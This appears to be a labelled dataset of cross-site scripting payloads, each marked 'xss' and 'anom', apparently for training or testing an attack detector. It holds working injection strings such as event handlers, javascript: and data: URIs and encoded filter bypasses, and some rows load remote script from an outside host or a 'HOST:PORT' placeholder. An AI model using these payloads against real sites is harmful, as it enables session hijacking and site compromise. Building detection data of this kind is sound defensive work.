payload,attack_type,label
"<button type=""button"" onpause=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onplay=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onpopstate=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onprogress=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onratechange=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onreadystatechange=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onredo=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onresize=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onscroll=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onseeked=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onseeking=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onselect=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onstalled=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onstorage=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onsuspend=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onundo=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onunload=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onvolumechange=""function()"">Click Me!</button>",xss,anom
"<button type=""button"" onwaiting=""function()"">Click Me!</button>",xss,anom
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\),xss,anom
javascript://%0Aalert(1),xss,anom
javascript://anything%0D%0A%0D%0Awindow.alert(1),xss,anom
"data:text/html,<script>alert(0)</script>",xss,anom
<svg onload=alert(1)>,xss,anom
"""><svg onload=alert(1)//",xss,anom
"""onmouseover=alert(1)//",xss,anom
"""autofocus/onfocus=alert(1)//",xss,anom
'-alert(1)-',xss,anom
'-alert(1)//,xss,anom
\'-alert(1)//,xss,anom
</script><svg onload=alert(1)>,xss,anom
<x contenteditable onblur=alert(1)>lose focus! ,xss,anom
<x onclick=alert(1)>click this! ,xss,anom
<x oncopy=alert(1)>copy this! ,xss,anom
<x oncontextmenu=alert(1)>right click this! ,xss,anom
<x oncut=alert(1)>copy this! ,xss,anom
<x ondblclick=alert(1)>double click this! ,xss,anom
<x ondrag=alert(1)>drag this! ,xss,anom
<x contenteditable onfocus=alert(1)>focus this! ,xss,anom
<x contenteditable oninput=alert(1)>input here! ,xss,anom
<x contenteditable onkeydown=alert(1)>press any key! ,xss,anom
<x contenteditable onkeypress=alert(1)>press any key! ,xss,anom
<x contenteditable onkeyup=alert(1)>press any key! ,xss,anom
<x onmousedown=alert(1)>click this! ,xss,anom
<x onmousemove=alert(1)>hover this! ,xss,anom
<x onmouseout=alert(1)>hover this! ,xss,anom
<x onmouseover=alert(1)>hover this! ,xss,anom
<x onmouseup=alert(1)>click this! ,xss,anom
<x contenteditable onpaste=alert(1)>paste here!,xss,anom
<script>alert(1)// ,xss,anom
<script>alert(1)<!–,xss,anom
<script src=//brutelogic.com.br/1.js> ,xss,anom
<script src=//3334957647/1>,xss,anom
%3Cx onxxx=alert(1) ,xss,anom
<%78 onxxx=1 ,xss,anom
<x %6Fnxxx=1 ,xss,anom
<x o%6Exxx=1 ,xss,anom
<x on%78xx=1 ,xss,anom
<x onxxx%3D1,xss,anom
<X onxxx=1 ,xss,anom
<x OnXxx=1 ,xss,anom
<X OnXxx=1 ,xss,anom
<x onxxx=1 onxxx=1,xss,anom
<x/onxxx=1 ,xss,anom
<x%09onxxx=1 ,xss,anom
<x%0Aonxxx=1 ,xss,anom
<x%0Conxxx=1 ,xss,anom
<x%0Donxxx=1 ,xss,anom
<x%2Fonxxx=1 ,xss,anom
<x 1='1'onxxx=1 ,xss,anom
"<x 1=""1""onxxx=1",xss,anom
<x </onxxx=1 ,xss,anom
"<x 1="">"" onxxx=1 ",xss,anom
<http://onxxx%3D1/,xss,anom
<x onxxx=alert(1) 1=',xss,anom
"<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",xss,anom
'onload=alert(1)><svg/1=',xss,anom
'>alert(1)</script><script/1=' ,xss,anom
*/alert(1)</script><script>/*,xss,anom
"*/alert(1)"">'onload=""/*<svg/1='",xss,anom
"`-alert(1)"">'onload=""`<svg/1='",xss,anom
*/</script>'>alert(1)/*<script/1=',xss,anom
<script>alert(1)</script> ,xss,anom
<script src=javascript:alert(1)> ,xss,anom
<iframe src=javascript:alert(1)> ,xss,anom
<embed src=javascript:alert(1)> ,xss,anom
<a href=javascript:alert(1)>click ,xss,anom
<math><brute href=javascript:alert(1)>click ,xss,anom
<form action=javascript:alert(1)><input type=submit> ,xss,anom
<isindex action=javascript:alert(1) type=submit value=click> ,xss,anom
<form><button formaction=javascript:alert(1)>click ,xss,anom
<form><input formaction=javascript:alert(1) type=submit value=click> ,xss,anom
<form><input formaction=javascript:alert(1) type=image value=click> ,xss,anom
<form><input formaction=javascript:alert(1) type=image src=SOURCE> ,xss,anom
<isindex formaction=javascript:alert(1) type=submit value=click> ,xss,anom
<object data=javascript:alert(1)> ,xss,anom
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> ,xss,anom
"<svg><script xlink:href=data:,alert(1) /> ",xss,anom
<math><brute xlink:href=javascript:alert(1)>click ,xss,anom
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>,xss,anom
<html ontouchstart=alert(1)> ,xss,anom
<html ontouchend=alert(1)> ,xss,anom
<html ontouchmove=alert(1)> ,xss,anom
<html ontouchcancel=alert(1)>,xss,anom
<body onorientationchange=alert(1)>,xss,anom
"""><img src=1 onerror=alert(1)>.gif",xss,anom
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(document.domain)""/>",xss,anom
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,xss,anom
"<script src=""data:&comma;alert(1)//",xss,anom
"""><script src=data:&comma;alert(1)//",xss,anom
"<script src=""//brutelogic.com.br&sol;1.js&num; ",xss,anom
"""><script src=//brutelogic.com.br&sol;1.js&num; ",xss,anom
"<link rel=import href=""data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; ",xss,anom
"""><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;",xss,anom
<base href=//0>,xss,anom
"<script/src=""data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)",xss,anom
<body onload=alert(1)>,xss,anom
<body onpageshow=alert(1)>,xss,anom
<body onfocus=alert(1)>,xss,anom
<body onhashchange=alert(1)><a href=#x>click this!#x,xss,anom
<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x,xss,anom
<body onscroll=alert(1)><br><br><br><br>,xss,anom
<br><br><br><br><br><br><br><br><br><br>,xss,anom
<br><br><br><br><br><br><br><br><br><br>,xss,anom
<br><br><br><br><br><br><x id=x>#x,xss,anom
<body onresize=alert(1)>press F12!,xss,anom
<body onhelp=alert(1)>press F1! (MSIE),xss,anom
<marquee onstart=alert(1)>,xss,anom
<marquee loop=1 width=0 onfinish=alert(1)>,xss,anom
<audio src onloadstart=alert(1)>,xss,anom
<video onloadstart=alert(1)><source>,xss,anom
<input autofocus onblur=alert(1)>,xss,anom
<keygen autofocus onfocus=alert(1)>,xss,anom
<form onsubmit=alert(1)><input type=submit>,xss,anom
<select onchange=alert(1)><option>1<option>2,xss,anom
<menu id=x contextmenu=x onshow=alert(1)>right click me!,xss,anom
alert`1`,xss,anom
alert&lpar;1&rpar;,xss,anom
alert&#x28;1&#x29,xss,anom
alert&#40;1&#41,xss,anom
(alert)(1),xss,anom
"a=alert,a(1)",xss,anom
[1].find(alert),xss,anom
"top[""al""+""ert""](1)",xss,anom
top[/al/.source+/ert/.source](1),xss,anom
al\u0065rt(1),xss,anom
top['al\145rt'](1),xss,anom
top['al\x65rt'](1),xss,anom
top[8680439..toString(30)](1),xss,anom
navigator.vibrate(500),xss,anom
eval(URL.slice(-8))>#alert(1),xss,anom
eval(location.hash.slice(1)>#alert(1),xss,anom
innerHTML=location.hash>#<script>alert(1)</script>,xss,anom
"<a draggable=""true"" ondrag=""alert(1)"">test</a>",xss,anom
"<a draggable=""true"" ondragend=""alert(1)"">test</a>",xss,anom
"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",xss,anom
"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",xss,anom
"<a draggable=""true"" ondragstart=""alert(1)"">test</a>",xss,anom
<a id=x tabindex=1 onactivate=alert(1)></a>,xss,anom
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,xss,anom
<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>,xss,anom
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>,xss,anom
<a id=x tabindex=1 onfocus=alert(1)></a>,xss,anom
<a id=x tabindex=1 onfocusin=alert(1)></a>,xss,anom
"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",xss,anom
"<a onbeforecut=""alert(1)"" contenteditable>test</a>",xss,anom
"<a onbeforepaste=""alert(1)"" contenteditable>test</a>",xss,anom
<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>,xss,anom
"<a onclick=""alert(1)"">test</a>",xss,anom
"<a oncontextmenu=""alert(1)"">test</a>",xss,anom
"<a oncopy=""alert(1)"" contenteditable>test</a>",xss,anom
"<a oncut=""alert(1)"" contenteditable>test</a>",xss,anom
"<a ondblclick=""alert(1)"">test</a>",xss,anom
<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>,xss,anom
"<a onkeydown=""alert(1)"" contenteditable>test</a>",xss,anom
"<a onkeypress=""alert(1)"" contenteditable>test</a>",xss,anom
"<a onkeyup=""alert(1)"" contenteditable>test</a>",xss,anom
"<a onmousedown=""alert(1)"">test</a>",xss,anom
"<a onmouseenter=""alert(1)"">test</a>",xss,anom
"<a onmouseleave=""alert(1)"">test</a>",xss,anom
"<a onmousemove=""alert(1)"">test</a>",xss,anom
"<a onmouseout=""alert(1)"">test</a>",xss,anom
"<a onmouseover=""alert(1)"">test</a>",xss,anom
"<a onmouseup=""alert(1)"">test</a>",xss,anom
"<a onpaste=""alert(1)"" contenteditable>test</a>",xss,anom
"<abbr draggable=""true"" ondrag=""alert(1)"">test</abbr>",xss,anom
"<abbr draggable=""true"" ondragend=""alert(1)"">test</abbr>",xss,anom
"<abbr draggable=""true"" ondragenter=""alert(1)"">test</abbr>",xss,anom
"<abbr draggable=""true"" ondragleave=""alert(1)"">test</abbr>",xss,anom
"<abbr draggable=""true"" ondragstart=""alert(1)"">test</abbr>",xss,anom
<abbr id=x tabindex=1 onactivate=alert(1)></abbr>,xss,anom
<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>,xss,anom
<abbr id=x tabindex=1 onbeforedeactivate=alert(1)></abbr><input autofocus>,xss,anom
<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>,xss,anom
<abbr id=x tabindex=1 onfocus=alert(1)></abbr>,xss,anom
<abbr id=x tabindex=1 onfocusin=alert(1)></abbr>,xss,anom
"<abbr onbeforecopy=""alert(1)"" contenteditable>test</abbr>",xss,anom
"<abbr onbeforecut=""alert(1)"" contenteditable>test</abbr>",xss,anom
"<abbr onbeforepaste=""alert(1)"" contenteditable>test</abbr>",xss,anom
<abbr onblur=alert(1) tabindex=1 id=x></abbr><input autofocus>,xss,anom
"<abbr onclick=""alert(1)"">test</abbr>",xss,anom
"<abbr oncontextmenu=""alert(1)"">test</abbr>",xss,anom
"<abbr oncopy=""alert(1)"" contenteditable>test</abbr>",xss,anom
"<abbr oncut=""alert(1)"" contenteditable>test</abbr>",xss,anom
"<abbr ondblclick=""alert(1)"">test</abbr>",xss,anom
<abbr onfocusout=alert(1) tabindex=1 id=x></abbr><input autofocus>,xss,anom
"<abbr onkeydown=""alert(1)"" contenteditable>test</abbr>",xss,anom
"<abbr onkeypress=""alert(1)"" contenteditable>test</abbr>",xss,anom
"<abbr onkeyup=""alert(1)"" contenteditable>test</abbr>",xss,anom
"<abbr onmousedown=""alert(1)"">test</abbr>",xss,anom
"<abbr onmouseenter=""alert(1)"">test</abbr>",xss,anom
"<abbr onmouseleave=""alert(1)"">test</abbr>",xss,anom
"<abbr onmousemove=""alert(1)"">test</abbr>",xss,anom
"<abbr onmouseout=""alert(1)"">test</abbr>",xss,anom
"<abbr onmouseover=""alert(1)"">test</abbr>",xss,anom
"<abbr onmouseup=""alert(1)"">test</abbr>",xss,anom
"<abbr onpaste=""alert(1)"" contenteditable>test</abbr>",xss,anom
"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",xss,anom
"<acronym draggable=""true"" ondragend=""alert(1)"">test</acronym>",xss,anom
"<acronym draggable=""true"" ondragenter=""alert(1)"">test</acronym>",xss,anom
"<acronym draggable=""true"" ondragleave=""alert(1)"">test</acronym>",xss,anom
"<acronym draggable=""true"" ondragstart=""alert(1)"">test</acronym>",xss,anom
<acronym id=x tabindex=1 onactivate=alert(1)></acronym>,xss,anom
<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>,xss,anom
<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>,xss,anom
<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>,xss,anom
<acronym id=x tabindex=1 onfocus=alert(1)></acronym>,xss,anom
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,xss,anom
"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>",xss,anom
"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",xss,anom
"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>",xss,anom
<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>,xss,anom
"<acronym onclick=""alert(1)"">test</acronym>",xss,anom
"<acronym oncontextmenu=""alert(1)"">test</acronym>",xss,anom
"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>",xss,anom
"<acronym oncut=""alert(1)"" contenteditable>test</acronym>",xss,anom
"<acronym ondblclick=""alert(1)"">test</acronym>",xss,anom
<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>,xss,anom
"<acronym onkeydown=""alert(1)"" contenteditable>test</acronym>",xss,anom
"<acronym onkeypress=""alert(1)"" contenteditable>test</acronym>",xss,anom
"<acronym onkeyup=""alert(1)"" contenteditable>test</acronym>",xss,anom
"<acronym onmousedown=""alert(1)"">test</acronym>",xss,anom
"<acronym onmouseenter=""alert(1)"">test</acronym>",xss,anom
"<acronym onmouseleave=""alert(1)"">test</acronym>",xss,anom
"<acronym onmousemove=""alert(1)"">test</acronym>",xss,anom
"<acronym onmouseout=""alert(1)"">test</acronym>",xss,anom
"<acronym onmouseover=""alert(1)"">test</acronym>",xss,anom
"<acronym onmouseup=""alert(1)"">test</acronym>",xss,anom
"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",xss,anom
"<address draggable=""true"" ondrag=""alert(1)"">test</address>",xss,anom
"<address draggable=""true"" ondragend=""alert(1)"">test</address>",xss,anom
"<address draggable=""true"" ondragenter=""alert(1)"">test</address>",xss,anom
"<address draggable=""true"" ondragleave=""alert(1)"">test</address>",xss,anom
"<address draggable=""true"" ondragstart=""alert(1)"">test</address>",xss,anom
<address id=x tabindex=1 onactivate=alert(1)></address>,xss,anom
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,xss,anom
<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>,xss,anom
<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>,xss,anom
<address id=x tabindex=1 onfocus=alert(1)></address>,xss,anom
<address id=x tabindex=1 onfocusin=alert(1)></address>,xss,anom
"<address onbeforecopy=""alert(1)"" contenteditable>test</address>",xss,anom
"<address onbeforecut=""alert(1)"" contenteditable>test</address>",xss,anom
"<address onbeforepaste=""alert(1)"" contenteditable>test</address>",xss,anom
<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>,xss,anom
"<address onclick=""alert(1)"">test</address>",xss,anom
"<address oncontextmenu=""alert(1)"">test</address>",xss,anom
"<address oncopy=""alert(1)"" contenteditable>test</address>",xss,anom
"<address oncut=""alert(1)"" contenteditable>test</address>",xss,anom
"<address ondblclick=""alert(1)"">test</address>",xss,anom
<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>,xss,anom
"<address onkeydown=""alert(1)"" contenteditable>test</address>",xss,anom
"<address onkeypress=""alert(1)"" contenteditable>test</address>",xss,anom
"<address onkeyup=""alert(1)"" contenteditable>test</address>",xss,anom
"<address onmousedown=""alert(1)"">test</address>",xss,anom
"<address onmouseenter=""alert(1)"">test</address>",xss,anom
"<address onmouseleave=""alert(1)"">test</address>",xss,anom
"<address onmousemove=""alert(1)"">test</address>",xss,anom
"<address onmouseout=""alert(1)"">test</address>",xss,anom
"<address onmouseover=""alert(1)"">test</address>",xss,anom
"<address onmouseup=""alert(1)"">test</address>",xss,anom
"<address onpaste=""alert(1)"" contenteditable>test</address>",xss,anom
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",xss,anom
"<applet draggable=""true"" ondragend=""alert(1)"">test</applet>",xss,anom
"<applet draggable=""true"" ondragenter=""alert(1)"">test</applet>",xss,anom
"<applet draggable=""true"" ondragleave=""alert(1)"">test</applet>",xss,anom
"<applet draggable=""true"" ondragstart=""alert(1)"">test</applet>",xss,anom
